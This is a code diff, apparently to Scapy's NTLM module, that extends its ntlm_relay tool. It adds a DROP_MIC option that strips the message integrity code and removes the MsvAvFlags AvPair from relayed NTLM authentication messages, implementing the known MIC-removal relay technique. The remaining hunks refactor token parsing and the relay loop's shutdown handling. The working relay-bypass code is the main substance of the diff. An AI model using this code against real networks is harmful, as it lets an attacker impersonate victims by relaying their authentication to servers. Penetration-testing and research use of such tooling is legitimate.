@@ -11,6 +11,7 @@ https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-NLMP/%
 
 import socket
 import struct
+import threading
 
 from scapy.arch import get_if_addr
 from scapy.asn1.asn1 import ASN1_STRING
@@ -21,6 +22,7 @@ from scapy.fields import (
     Field,
     ByteEnumField,
     ByteField,
+    ConditionalField,
     FieldLenField,
     FlagsField,
     LEIntField,
@@ -437,7 +439,10 @@ class NTLM_AUTHENTICATE(Packet):
         # VERSION
         _NTLM_Version,
         # MIC
-        XStrFixedLenField('MIC', b"", length=16),
+        ConditionalField(
+            XStrFixedLenField('MIC', b"", length=16),
+            lambda pkt: pkt.fields.get('MIC', b"") is not None
+        ),
         # Payload
         _NTLMPayloadField(
             'Payload', OFFSET, [
@@ -513,27 +518,45 @@ class _NTLM_Automaton(Automaton):
             return None, negResult, MIC
 
         if isinstance(token, bytes):
-            return NTLM_Header(token), negResult, MIC
-        if isinstance(token, conf.raw_layer):
-            return NTLM_Header(token.load), negResult, MIC
-        if isinstance(token, GSSAPI_BLOB):
-            token = token.innerContextToken
-        if isinstance(token, SPNEGO_negToken):
-            token = token.token
-        if hasattr(token, "mechListMIC") and token.mechListMIC:
-            MIC = token.mechListMIC.value
-        if hasattr(token, "negResult"):
-            negResult = token.negResult
-        try:
-            ntlm = token.mechToken
-        except AttributeError:
-            ntlm = token.responseToken
-        if isinstance(ntlm, SPNEGO_Token):
-            ntlm = ntlm.value
-        if isinstance(ntlm, ASN1_STRING):
-            ntlm = NTLM_Header(ntlm.val)
-        if isinstance(ntlm, conf.raw_layer):
-            ntlm = NTLM_Header(ntlm.load)
+            ntlm = NTLM_Header(token)
+        elif isinstance(token, conf.raw_layer):
+            ntlm = NTLM_Header(token.load)
+        else:
+            if isinstance(token, GSSAPI_BLOB):
+                token = token.innerContextToken
+            if isinstance(token, SPNEGO_negToken):
+                token = token.token
+            if hasattr(token, "mechListMIC") and token.mechListMIC:
+                MIC = token.mechListMIC.value
+            if hasattr(token, "negResult"):
+                negResult = token.negResult
+            try:
+                ntlm = token.mechToken
+            except AttributeError:
+                ntlm = token.responseToken
+            if isinstance(ntlm, SPNEGO_Token):
+                ntlm = ntlm.value
+            if isinstance(ntlm, ASN1_STRING):
+                ntlm = NTLM_Header(ntlm.val)
+            if isinstance(ntlm, conf.raw_layer):
+                ntlm = NTLM_Header(ntlm.load)
+        if self.DROP_MIC:
+            ntlm.MIC = None
+            ntlm.NtChallengeResponseLen = None
+            ntlm.NtChallengeResponseMaxLen = None
+            ntlm.EncryptedRandomSessionKeyBufferOffset = None
+            try:
+                ChallengeResponse = next(
+                    v[1] for v in ntlm.Payload
+                    if v[0] == 'NtChallengeResponse'
+                )
+                i = next(
+                    i for i, k in enumerate(ChallengeResponse.AvPairs)
+                    if k.AvId == 0x0006
+                )
+                del ChallengeResponse.AvPairs[i]
+            except StopIteration:
+                pass
         return ntlm, negResult, MIC
 
     def received_ntlm_token(self, ntlm):
@@ -651,7 +674,8 @@ def ntlm_relay(serverCls,
         client_kwargs["ALLOW_SMB2"] = server_kwargs["ALLOW_SMB2"] = ALLOW_SMB2
     server_kwargs.update(remoteClientCls.kwargs_cls.get(serverCls, {}))
     try:
-        while True:
+        evt = threading.Event()
+        while not evt.is_set():
             clientsocket, address = ssock.accept()
             sock = StreamSocket(clientsocket, serverCls.cls)
             srv_atmt = serverCls(sock, debug=4, **server_kwargs)
@@ -664,7 +688,8 @@ def ntlm_relay(serverCls,
                   (repr(address), repr(_sock.getsockname())))
             remote_sock = StreamSocket(_sock, remoteClientCls.cls)
             cli_atmt = remoteClientCls(remote_sock, debug=4, **client_kwargs)
-            sniffers.append(((srv_atmt, cli_atmt), (sock, remote_sock)))
+            sock_tup = ((srv_atmt, cli_atmt), (sock, remote_sock))
+            sniffers.append(sock_tup)
             # Bind NTLM functions
             srv_atmt.bind(cli_atmt)
             cli_atmt.bind(srv_atmt)
@@ -674,12 +699,15 @@ def ntlm_relay(serverCls,
     except KeyboardInterrupt:
         print("Exiting.")
     finally:
-        for (atmts, socks) in sniffers:
+        for atmts, socks in sniffers:
             for atmt in atmts:
                 try:
-                    atmt.forcestop()
+                    atmt.forcestop(wait=False)
                 except Exception:
                     pass
             for sock in socks:
-                sock.close()
+                try:
+                    sock.close()
+                except Exception:
+                    pass
         ssock.close()
